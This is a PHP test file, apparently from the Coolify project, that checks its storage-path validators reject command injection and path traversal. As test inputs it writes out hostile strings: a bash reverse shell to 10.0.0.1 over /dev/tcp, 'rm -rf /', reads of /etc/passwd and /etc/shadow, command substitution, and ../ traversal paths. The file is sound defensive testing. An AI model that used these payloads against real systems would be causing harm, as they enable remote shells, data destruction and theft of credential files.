<?php

/**
 * File Storage Security Tests
 *
 * Tests to ensure file storage directory mount functionality is protected against
 * command injection attacks via malicious storage paths.
 *
 * Related Issues: #6 in security_issues.md
 * Related Files:
 *  - app/Models/LocalFileVolume.php
 *  - app/Livewire/Project/Service/Storage.php
 */
test('file storage rejects command injection in path with command substitution', function () {
    expect(fn () => validateShellSafePath('/tmp$(whoami)', 'storage path'))
        ->toThrow(Exception::class);
});

test('file storage rejects command injection with semicolon', function () {
    expect(fn () => validateShellSafePath('/data; rm -rf /', 'storage path'))
        ->toThrow(Exception::class);
});

test('file storage rejects command injection with pipe', function () {
    expect(fn () => validateShellSafePath('/app | cat /etc/passwd', 'storage path'))
        ->toThrow(Exception::class);
});

test('file storage rejects command injection with backticks', function () {
    expect(fn () => validateShellSafePath('/tmp`id`/data', 'storage path'))
        ->toThrow(Exception::class);
});

test('file storage rejects command injection with ampersand', function () {
    expect(fn () => validateShellSafePath('/data && whoami', 'storage path'))
        ->toThrow(Exception::class);
});

test('file storage rejects command injection with redirect operators', function () {
    expect(fn () => validateShellSafePath('/tmp > /tmp/evil', 'storage path'))
        ->toThrow(Exception::class);

    expect(fn () => validateShellSafePath('/data < /etc/shadow', 'storage path'))
        ->toThrow(Exception::class);
});

test('file storage rejects reverse shell payload', function () {
    expect(fn () => validateShellSafePath('/tmp$(bash -i >& /dev/tcp/10.0.0.1/8888 0>&1)', 'storage path'))
        ->toThrow(Exception::class);
});

test('file storage escapes paths properly', function () {
    $path = "/var/www/app's data";
    $escaped = escapeshellarg($path);

    expect($escaped)->toBe("'/var/www/app'\\''s data'");
});

test('file storage escapes paths with spaces', function () {
    $path = '/var/www/my app/data';
    $escaped = escapeshellarg($path);

    expect($escaped)->toBe("'/var/www/my app/data'");
});

test('file storage escapes paths with special characters', function () {
    $path = '/var/www/app (production)/data';
    $escaped = escapeshellarg($path);

    expect($escaped)->toBe("'/var/www/app (production)/data'");
});

test('file storage accepts legitimate absolute paths', function () {
    expect(fn () => validateShellSafePath('/var/www/app', 'storage path'))
        ->not->toThrow(Exception::class);

    expect(fn () => validateShellSafePath('/tmp/uploads', 'storage path'))
        ->not->toThrow(Exception::class);

    expect(fn () => validateShellSafePath('/data/storage', 'storage path'))
        ->not->toThrow(Exception::class);

    expect(fn () => validateShellSafePath('/app/persistent-data', 'storage path'))
        ->not->toThrow(Exception::class);
});

test('file storage accepts paths with underscores and hyphens', function () {
    expect(fn () => validateShellSafePath('/var/www/my_app-data', 'storage path'))
        ->not->toThrow(Exception::class);

    expect(fn () => validateShellSafePath('/tmp/upload_dir-2024', 'storage path'))
        ->not->toThrow(Exception::class);
});

// --- Regression tests for file mount path validation ---
// These verify that file mount paths (not just directory mounts) are validated,
// and that saveStorageOnServer() validates fs_path before any shell interpolation.

test('file storage rejects command injection in file mount path context', function () {
    $maliciousPaths = [
        '/app/config$(id)',
        '/app/config;whoami',
        '/app/config|cat /etc/passwd',
        '/app/config`id`',
        '/app/config&whoami',
        '/app/config>/tmp/pwned',
        '/app/config</etc/shadow',
        "/app/config\nrm -rf /",
    ];

    foreach ($maliciousPaths as $path) {
        expect(fn () => validateShellSafePath($path, 'file storage path'))
            ->toThrow(Exception::class);
    }
});

test('file storage rejects variable substitution in paths', function () {
    expect(fn () => validateShellSafePath('/data/${IFS}cat${IFS}/etc/passwd', 'file storage path'))
        ->toThrow(Exception::class);
});

test('file storage accepts safe file mount paths', function () {
    $safePaths = [
        '/etc/nginx/nginx.conf',
        '/app/.env',
        '/data/coolify/services/abc123/config.yml',
        '/var/www/html/index.php',
        '/opt/app/config/database.json',
    ];

    foreach ($safePaths as $path) {
        expect(fn () => validateShellSafePath($path, 'file storage path'))
            ->not->toThrow(Exception::class);
    }
});

test('file storage accepts relative dot-prefixed paths', function () {
    expect(fn () => validateShellSafePath('./config/app.yaml', 'storage path'))
        ->not->toThrow(Exception::class);

    expect(fn () => validateShellSafePath('./data', 'storage path'))
        ->not->toThrow(Exception::class);
});

test('file mount path validator rejects parent segments and unsafe separators', function (string $path) {
    expect(fn () => validateFileMountPath($path, 'file storage path'))
        ->toThrow(Exception::class);
})->with([
    'parent segment to etc' => ['/../../etc/passwd'],
    'embedded parent segment' => ['/foo/../bar'],
    'parent segment' => ['/..'],
    'double slash before parent segment' => ['/foo//../bar'],
    'current directory segment' => ['/foo/./bar'],
    'backslash parent segment' => ['\\..\\etc\\passwd'],
    'null byte' => ["/app/config\0/../../etc/passwd"],
]);

test('file mount path validator accepts safe absolute container file paths', function (string $path, string $expected) {
    expect(validateFileMountPath($path, 'file storage path'))->toBe($expected);
})->with([
    'nginx config' => ['/etc/nginx/nginx.conf', '/etc/nginx/nginx.conf'],
    'app env filename' => ['/app/.env', '/app/.env'],
    'relative input becomes absolute' => ['config/app.yaml', '/config/app.yaml'],
    'duplicate slashes collapse' => ['/opt//app///config.json', '/opt/app/config.json'],
]);

test('host file mount path validator accepts absolute host file paths', function () {
    expect(validateHostFileMountPath('/etc/nginx/nginx.conf', 'host file path'))
        ->toBe('/etc/nginx/nginx.conf');
});

test('host file mount path validator rejects ambiguous or directory paths', function (string $path) {
    expect(fn () => validateHostFileMountPath($path, 'host file path'))
        ->toThrow(Exception::class);
})->with([
    'relative path' => ['etc/nginx/nginx.conf'],
    'root directory' => ['/'],
    'trailing slash' => ['/etc/nginx/'],
    'parent segment' => ['/etc/../shadow'],
    'current segment' => ['/etc/./nginx.conf'],
    'backslash' => ['\\etc\\nginx.conf'],
]);

test('confined path resolver keeps file mounts inside their resource configuration root', function () {
    expect(confineFileMountPath('/data/coolify/applications/app-uuid', '/etc/nginx/nginx.conf', 'file storage path'))
        ->toBe('/data/coolify/applications/app-uuid/etc/nginx/nginx.conf');

    expect(confineFileMountPath('/data/coolify/databases/db-uuid/', 'postgres/postgresql.conf', 'file storage path'))
        ->toBe('/data/coolify/databases/db-uuid/postgres/postgresql.conf');

    expect(confineFileMountPath('/data/coolify/services/service-uuid', '/config.yaml', 'file storage path'))
        ->toBe('/data/coolify/services/service-uuid/config.yaml');
});

test('confined path resolver rejects paths that escape the resource configuration root', function (string $base, string $path) {
    expect(fn () => confineFileMountPath($base, $path, 'file storage path'))
        ->toThrow(Exception::class);
})->with([
    'application parent segment' => ['/data/coolify/applications/app-uuid', '/../../etc/passwd'],
    'database parent segment' => ['/data/coolify/databases/db-uuid', '/postgres/../../../etc/shadow'],
    'service dot segment' => ['/data/coolify/services/service-uuid', '/./config.yaml'],
]);

test('local file volume write sink keeps saved managed file paths for compatibility', function () {
    $source = file_get_contents(__DIR__.'/../../app/Models/LocalFileVolume.php');

    expect($source)->not->toContain('confinePathToBase($workdir, $path->value(), \'storage path\')')
        ->and($source)->toContain('tee {$escapedPath}');
});

test('host file mounts are bind-only and skipped by server storage writes', function () {
    $source = file_get_contents(__DIR__.'/../../app/Models/LocalFileVolume.php');

    expect($source)->toContain('if ($this->is_host_file) {')
        ->and($source)->toContain('return;')
        ->and($source)->toContain('tee {$escapedPath}');
});
